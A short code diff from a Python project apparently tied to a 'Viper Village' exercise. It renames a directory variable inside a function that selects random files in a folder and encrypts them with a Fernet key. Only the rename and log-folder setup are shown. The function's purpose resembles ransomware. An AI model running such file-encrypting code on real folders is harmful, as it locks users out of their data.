@@ -29,8 +29,8 @@ def select_and_encrypt_files(folder_path, num_files=6):
     # select random files from the folder and encrypt them
     key = generate_key()
     cipher_suite = Fernet(key)
-    noname_directory = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..'))
-    log_directory = os.path.join(noname_directory, 'logs')
+    viper_village_directory = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..'))
+    log_directory = os.path.join(viper_village_directory, 'logs')
 
     if not os.path.exists(log_directory):
         os.makedirs(log_directory)
